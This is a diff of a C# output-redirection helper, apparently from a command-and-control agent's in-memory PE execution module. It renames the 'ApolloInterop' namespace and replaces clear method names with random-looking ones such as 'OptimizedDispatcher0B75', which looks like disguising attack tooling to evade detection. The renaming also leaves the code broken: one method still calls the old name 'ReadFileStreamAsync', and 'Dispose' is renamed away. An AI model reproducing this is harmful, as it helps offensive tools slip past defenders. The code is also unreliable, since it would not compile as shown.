@@ -5,7 +5,7 @@ using System.IO;
 using static ExecutePE.Internals.NativeDeclarations;
 using System.Threading.Tasks;
 using System.Threading;
-using ApolloInterop.Classes.Events;
+using PhantomInterop.Classes.Events;
 
 namespace ExecutePE.Helpers
 {
@@ -41,7 +41,7 @@ namespace ExecutePE.Helpers
         }
 
 
-        private void Initialize()
+        private void OptimizedDispatcher0B75()
         {
 
             string stdoutGuid = Guid.NewGuid().ToString();
@@ -61,7 +61,7 @@ namespace ExecutePE.Helpers
             SetStdHandle(StdHandles.Stderr, stdoutClientStream.SafePipeHandle.DangerousGetHandle());
         }
 
-        private void ReadFileStreamAsync(FileStream stream, EventHandler<StringDataEventArgs> eventhandler)
+        private void IntelligentTracker2DEB(FileStream stream, EventHandler<StringDataEventArgs> eventhandler)
         {
             int szBuf = 4096;
             byte[] tmp;
@@ -115,12 +115,12 @@ namespace ExecutePE.Helpers
             } while (n > 0);
         }
 
-        private void ReadStdoutAsync()
+        private void RobustWorker9EFD()
         {
             ReadFileStreamAsync(stdoutReader, _stdoutHandler);
         }
 
-        public void Dispose()
+        public void SpectreWorkerD99D()
         {
             SetStdHandle(StdHandles.Stderr, _oldStderr);
             SetStdHandle(StdHandles.Stdout, _oldStdout);
